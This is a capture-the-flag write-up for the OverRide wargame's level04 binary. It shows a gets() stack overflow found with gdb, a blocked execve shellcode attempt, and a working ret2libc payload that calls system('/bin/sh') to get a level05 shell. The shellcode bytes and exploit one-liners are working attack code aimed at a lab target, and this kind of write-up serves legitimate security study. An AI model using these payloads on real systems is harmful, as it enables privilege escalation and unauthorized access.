# level04

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04

level04@OverRide:~$ file level04 
level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
```

The program takes an input an print some stuff:

```bash
level04@OverRide:~$ ./level04 
Give me some shellcode, k
asdsd
child is exiting...
```

By looking at the code we can see `gets`. As the program has a `fork`, we set `follow-fork-mode child` in gdb.
We try to overwrite `eip`:

```gdb
(gdb) set follow-fork-mode child
...
Give me some shellcode, k
[Switching to process 1962]

Breakpoint 1, 0x0804875e in main ()
(gdb) x/wx $esp
0xffffd490:     0xffffd4b0
(gdb) x/s 0xffffd4b0
0xffffd4b0:      ""
(gdb) info frame
Stack level 0, frame at 0xffffd550:
 eip = 0x804875e in main; saved eip 0xf7e45513
 Arglist at 0xffffd548, args: 
 Locals at 0xffffd548, Previous frame's sp is 0xffffd550
 Saved registers:
  ebx at 0xffffd540, ebp at 0xffffd548, edi at 0xffffd544, eip at 0xffffd54c
(gdb) p/d 0xffffd54c-0xffffd4b0
$1 = 156
```

Try to exploit:

```bash
level04@OverRide:~$ (python -c 'print "\x90" * (156 - 28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x75\xd7\xff\xff"'; cat) | ./level04
Give me some shellcode, k
no exec() for you
```

Seems that `execve` can't be executed. Let's try ret2libc.

First, find `system` function:

```bash
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
```

And then, find `"/bin/sh"` string:

```bash
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
```

Try to exploit:

[ padding ] [ system() ] [ return address ] [ "/bin/sh" ]

```bash
level04@OverRide:~$ (python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\xff\xff\xff\xff"+"\xec\x97\xf8\xf7"';cat) | ./level04
Give me some shellcode, k
whoami
level05
```
